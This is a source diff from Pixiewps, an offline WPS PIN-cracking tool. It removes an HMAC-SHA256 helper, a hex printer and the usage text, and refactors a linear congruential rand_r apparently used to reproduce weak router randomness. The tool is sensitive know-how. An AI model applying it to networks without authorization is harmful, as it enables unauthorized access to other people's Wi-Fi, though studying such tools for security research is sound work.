-	HMAC_CTX_init(&ctx);
-	HMAC_Init_ex(&ctx, key, key_len, EVP_sha256(), 0);
-	HMAC_Update(&ctx, data, data_len);
-	HMAC_Final(&ctx, digest, &h_len);
-	HMAC_CTX_cleanup(&ctx);
-}
-
 /* Linear congruential generator */
-int rand_r(unsigned int *seed) {
-	unsigned int s = *seed;
-	unsigned int uret;
+int32_t rand_r(uint32_t *seed) {
+	uint32_t s = *seed;
+	uint32_t uret;
 
-	s = (s * LCG_MULTIPLIER) + LCG_INCREMENT; /* Permutate seed */
-	uret = s & 0xffe00000;                    /* Use top 11 bits */
-	s = (s * LCG_MULTIPLIER) + LCG_INCREMENT; /* Permutate seed */
-	uret += (s & 0xfffc0000) >> 11;           /* Use top 14 bits */
-	s = (s * LCG_MULTIPLIER) + LCG_INCREMENT; /* Permutate seed */
-	uret += (s & 0xfe000000) >> (11 + 14);    /* Use top 7 bits */
+	s = (s * 1103515245) + 12345;          /* Permutate seed */
+	uret = s & 0xffe00000;                 /* Use top 11 bits */
+	s = (s * 1103515245) + 12345;          /* Permutate seed */
+	uret += (s & 0xfffc0000) >> 11;        /* Use top 14 bits */
+	s = (s * 1103515245) + 12345;          /* Permutate seed */
+	uret += (s & 0xfe000000) >> (11 + 14); /* Use top 7 bits */
 
 	*seed = s;
-	return (int) (uret & RAND_MAX);
+	return (int32_t) uret;
 }
 
-/* Prints a byte array in hexadecimal */
-void byte_array_print(unsigned char *buffer, unsigned int length) {
-	unsigned int i;
-	for (i = 0; i < length; i++) {
-		printf("%02x", buffer[i]);
-		if (i != length - 1) printf(":");
-	}
-}
-
-/* Info usage */
-void display_usage() {
-	puts("");
-	puts(" Pixiewps made by wiire");
-	puts("");
-	puts(" Usage: pixiewps <arguments>");
-	puts("");
-	puts(" Required Arguments:");
-	puts("");
-	puts("    -e, --pke      : Enrollee public key");
-	puts("    -r, --pkr      : Registrar public key");
-	puts("    -s, --e-hash1  : E-Hash1");
-	puts("    -z, --e-hash2  : E-Hash2");
-	puts("    -a, --authkey  : Key used in HMAC SHA-256");
-	puts("");
-	puts(" Optional Arguments:");
-	puts("");
-	puts("    -n, --e-nonce  : Enrollee nonce");
-	puts("    -S, --dh-small : Small Diffie-Hellman keys (--pkr not needed)");
-	puts("");
-	puts("    -h, --help     : Display this usage screen");
-	puts("");
-
-	exit(ARG_ERROR);
-}
